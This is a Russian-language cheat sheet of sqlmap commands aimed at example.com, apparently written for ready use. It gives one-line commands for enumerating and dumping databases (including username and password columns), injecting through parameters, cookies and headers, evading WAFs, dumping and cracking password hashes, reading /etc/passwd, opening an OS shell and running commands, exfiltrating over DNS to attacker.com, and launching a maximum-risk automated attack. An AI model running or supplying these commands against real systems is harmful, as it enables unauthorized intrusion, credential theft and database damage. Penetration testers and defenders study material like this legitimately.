Определение базы данных:
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" --dbs

Определение таблиц в базе:
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" -D target_db --tables

Определение колонок в таблице:
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" -D target_db -T target_table --columns

Извлечение данных из таблицы:
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" -D target_db -T target_table -C username,password --dump

_______________________________________________________________________________________________________________________________________

GET-параметры
> ```bash
> sqlmap -u "http://example.com/index.php?id=1"

POST-параметры
> ```bash
> sqlmap -u "http://example.com/login.php" --data="username=admin&password=123"

Cookie-параметры
> ```bash
> sqlmap -u "http://example.com/profile.php" --cookie="PHPSESSID=abcd1234"

HTTP-заголовки (User-Agent, Referer, X-Forwarded-For и т. д.)
> ```bash
> sqlmap -u "http://example.com/" --headers="User-Agent: evil_payload"

_______________________________________________________________________________________________________________________________________

Определение типа инъекции
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" --technique=U
```Где U – Union-based, можно заменить на B (Boolean-based), T (Time-based) и т. д.```

Обход WAF (Web Application Firewall)
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" --tamper=space2comment
```Можно использовать другие tamper-скрипты, например charencode, randomcase и т. д.```

Определение уровня привилегий
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" --privileges

Получение учетных данных пользователей базы
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" --users



Получение хешей паролей
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" --passwords

Попытка дешифровки хешей
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" --crack
_______________________________________________________________________________________________________________________________________

Автоматическое определение всех уязвимых параметров
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" --forms --crawl=3
```Ищет SQL-инъекции во всех найденных формах на сайте```

Поиск файлов на сервере
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" --file-read="/etc/passwd"

Загрузка шелла на сервер
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" --os-shell

Запуск команд на сервере
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" --os-cmd="whoami"

Обход защиты через Time-based SQL Injection
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" --technique=T --time-sec=5

Атака через DNS (Blind SQL Injection)
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" --dns-domain=attacker.com

Запуск мощной автоматической атаки
> ```bash
> sqlmap -u "http://example.com/index.php?id=1" --level=5 --risk=3 --batch
```
--level=5 – увеличивает глубину проверки
--risk=3 – максимальный уровень риска (может сломать базу)
--batch – отключает вопросы (запускает атаку автоматически)
